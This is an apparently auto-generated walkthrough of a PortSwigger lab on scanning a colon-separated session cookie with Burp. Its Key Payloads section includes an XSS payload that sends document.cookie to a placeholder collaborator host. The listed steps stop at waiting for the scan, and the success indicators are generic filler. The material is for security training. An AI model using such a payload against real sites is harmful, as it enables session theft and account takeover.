## Scanning non-standard data structures

**Category:** essential-skills
**Difficulty:** Unknown

### Description
This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

### Solution Steps
1. Log in to your account with the provided credentials.
2. In Burp, go to the Proxy > HTTP history tab.
3. Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.
4. Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as  two distinct inputs.
5. Select the first part of the session cookie, the cleartext wiener .
6. Right-click and select Scan selected insertion point , then click OK .
7. Go to the Dashboard and wait for the scan to complete.

### Key Payloads
- `carlos`
- `wiener:peter`
- `GET /my-account?id=wiener`
- `wiener`
- `'"><svg/onload=fetch(\`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}\`)>:YOUR-SESSION-ID`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: essential-skills

---
*Source: PortSwigger Web Security Academy*
